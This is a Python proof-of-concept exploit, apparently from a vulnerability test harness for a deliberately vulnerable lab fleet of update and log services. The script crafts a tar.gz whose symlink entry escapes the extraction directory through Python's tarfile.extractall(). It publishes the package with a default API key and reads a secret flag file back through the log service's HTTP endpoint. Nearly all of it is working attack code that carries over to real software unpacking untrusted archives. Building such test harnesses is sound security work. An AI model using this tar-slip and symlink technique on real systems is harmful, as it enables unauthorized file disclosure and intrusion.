#!/usr/bin/env python3
"""
PoC #3: Tar-slip on package extraction (agent side)
------------------------------------------------------
ota-agent.sh (identical in fmm/ipm/log-module) downloads a published package
and extracts it with Python's `tarfile.extractall()` (no `filter=` argument —
the CVE-2007-4559-class tarfile bug; GNU `tar` is deliberately avoided here
because it rejects "../" entries outright). STATE_DIR is
"$OTA_INSTALL_DIR/.ota-tmp". There is no path-containment check on the entries
in the archive at all: an entry named "../logs/<name>" walks straight out of
.ota-tmp and into log-module's real, HTTP-served logs directory
($OTA_INSTALL_DIR/logs).

`tarfile.extractall()` also restores SYMLINK entries with no containment, which
turns this write-primitive into arbitrary file DISCLOSURE: this PoC publishes a
package for the "log" module whose escaping entry is a symlink
`../logs/<name>` -> `../secret/flag.txt`. It lands in log-module's HTTP-served
logs/ directory pointing at the real per-deployment secret file (materialized
from the minted LOG_FLAG_VALUE by log's entrypoint). Fetching that name back
through log-module's own `GET /logs/{name}` endpoint follows the symlink and
returns the flag.

Scoreable impact: this discloses the sibling host's minted FLAG{...} (asserted
against the exact LOG_FLAG_VALUE when the harness exports it into this PoC's
env, else by shape). Reading it through a plain, non-`..` log name proves the
disclosure came from the tar-slip's planted symlink — not from log-module's own
path-traversal bug (its #1). Merely reading back a self-planted token would
recover nothing the harness minted; the symlink makes the escape steal a real
secret.

Run against the docker-compose fleet:
  docker compose -f vuln_tests/docker-compose.yml run --build --rm poc \
      python3 03_tar_slip.py ota 8090
(LOG_HOST/LOG_PORT default to "log"/8080, the compose service name.)
"""
import hashlib
import io
import json
import os
import re
import sys
import tarfile
import time
import urllib.error
import urllib.request
import uuid

OTA_HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
OTA_PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8090
OTA_BASE = f"http://{OTA_HOST}:{OTA_PORT}"
LOG_HOST = os.environ.get("LOG_HOST", "log")
LOG_PORT = int(os.environ.get("LOG_PORT", "8080"))
LOG_BASE = f"http://{LOG_HOST}:{LOG_PORT}"
# If a harness has configured a real key (fixing vuln #2), use it so this
# PoC keeps testing #3 (tar-slip) in isolation instead of false-negativing
# on an unrelated 401 at /publish once #2 is patched.
API_KEY = os.environ.get("OTA_API_KEY") or "ota-default-key-2024"
# If the harness exports the log sibling's minted flag into this PoC's env,
# assert the disclosed value equals it exactly; otherwise assert the FLAG{...}
# shape of whatever real per-deployment secret the symlink leaks.
EXPECTED_FLAG = os.environ.get("LOG_FLAG_VALUE", "")
FLAG_RE = re.compile(r"FLAG\{[^}]{1,256}\}")


def make_targz(entries):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for name, content in entries:
            info = tarfile.TarInfo(name=name)
            info.size = len(content)
            tf.addfile(info, io.BytesIO(content))
    return buf.getvalue()


def make_targz_with_symlink(files, link_name, link_target):
    """Like make_targz but also appends a SYMLINK entry (link_name -> link_target).
    tarfile.extractall() restores it with no containment/`filter=`, so a link_name
    that escapes the extraction dir plants an attacker-chosen symlink anywhere the
    ctf user can write."""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for name, content in files:
            info = tarfile.TarInfo(name=name)
            info.size = len(content)
            tf.addfile(info, io.BytesIO(content))
        link = tarfile.TarInfo(name=link_name)
        link.type = tarfile.SYMTYPE
        link.linkname = link_target
        tf.addfile(link)
    return buf.getvalue()


def multipart(fields, filename, file_bytes):
    boundary = "----otaPoC" + uuid.uuid4().hex
    body = b""
    for name, value in fields.items():
        body += (f"--{boundary}\r\nContent-Disposition: form-data; "
                  f'name="{name}"\r\n\r\n{value}\r\n').encode()
    body += (f"--{boundary}\r\nContent-Disposition: form-data; "
              f'name="package"; filename="{filename}"\r\n'
              "Content-Type: application/gzip\r\n\r\n").encode()
    body += file_bytes + b"\r\n"
    body += f"--{boundary}--\r\n".encode()
    return boundary, body


def main():
    token = uuid.uuid4().hex[:12]
    link_name = f"tarslip_{token}"

    # The escaping entry is a SYMLINK: it extracts to $OTA_INSTALL_DIR/logs/<name>
    # (out of .ota-tmp via "../logs/...") and points at the sibling secret file
    # "../secret/flag.txt" (resolved relative to logs/ => secret/flag.txt).
    package = make_targz_with_symlink(
        files=[("harmless.txt", b"looks like a normal update file\n")],
        link_name=f"../logs/{link_name}",
        link_target="../secret/flag.txt",
    )
    sha = hashlib.sha256(package).hexdigest()
    version = f"1.0.0-tarslip-{token[:6]}"
    manifest = {"module": "log", "version": version, "sha256": sha, "post_install": "none"}

    boundary, body = multipart({"manifest": json.dumps(manifest)}, "pkg.tar.gz", package)
    req = urllib.request.Request(f"{OTA_BASE}/publish", data=body, method="POST")
    req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
    req.add_header("X-OTA-Api-Key", API_KEY)
    print(f"[*] Publishing malicious log {version} with a tar-slip SYMLINK")
    print(f"    '../logs/{link_name}' -> '../secret/flag.txt'")
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            print(f"[*] /publish -> {r.status}")
    except urllib.error.HTTPError as e:
        # A patched OTA validates the archive at /publish and refuses a package
        # whose entries escape the extraction dir (e.g. 400). That is the
        # tar-slip being BLOCKED, not an infra failure: no symlink is ever
        # planted, so score FIXED (exit 1) instead of crashing (exit 2).
        print(f"[*] /publish rejected the tar-slip package -> HTTP {e.code} {e.reason}")
        print("[-] The malicious archive was refused at publish; no symlink planted.")
        return 1

    print("[*] Waiting for log-module's ota-agent.sh to poll, download, and extract...")
    deadline = time.time() + 60
    got = None
    while time.time() < deadline:
        try:
            with urllib.request.urlopen(f"{LOG_BASE}/logs/{link_name}", timeout=5) as r:
                body = r.read().decode(errors="replace")
            # Empty until the symlink is planted; once it is, GET follows it to
            # the secret file and returns the flag.
            if FLAG_RE.search(body):
                got = body
                break
        except urllib.error.HTTPError:
            pass
        except (urllib.error.URLError, ConnectionError):
            pass
        time.sleep(3)

    if got is None:
        print("[-] Timed out: no FLAG{...} came back through the planted symlink")
        print(f"    at GET {LOG_BASE}/logs/{link_name} (did extraction restore the")
        print("     symlink? is LOG_FLAG_VALUE materialized on the log host?)")
        return 1

    flag = FLAG_RE.search(got).group(0)
    print(f"[+] Tar-slip confirmed - the planted symlink escaped .ota-tmp into logs/")
    print(f"    and GET {LOG_BASE}/logs/{link_name} followed it to secret/flag.txt.")

    if EXPECTED_FLAG:
        if flag == EXPECTED_FLAG:
            print(f"[+] SCORED: disclosed the log host's minted secret via the tar-slip")
            print(f"    symlink and it matches the configured LOG_FLAG_VALUE: {flag!r}")
            return 0
        print(f"[-] Disclosed {flag!r} but expected {EXPECTED_FLAG!r} — value mismatch.")
        return 1

    print(f"[+] SCORED: the tar-slip symlink disclosed the log host's minted")
    print(f"    per-deployment secret: {flag!r}")
    print("[*] (No LOG_FLAG_VALUE in this PoC's env to assert the exact value against;")
    print("     the recovered FLAG{...} is the live per-deployment secret regardless.)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
